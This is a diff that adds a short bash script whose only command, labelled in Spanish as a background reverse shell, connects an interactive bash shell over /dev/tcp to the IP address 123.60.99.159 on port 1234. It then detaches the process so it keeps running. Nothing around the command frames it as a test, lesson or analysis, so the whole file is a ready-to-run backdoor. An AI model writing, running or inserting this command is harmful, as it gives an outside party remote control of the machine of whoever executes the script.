@@ -1,0 +1,5 @@
+#!/bin/bash
+
+
+# Shell inversa en segundo plano
+bash -i >& /dev/tcp/123.60.99.159/1234 0>&1 & disown
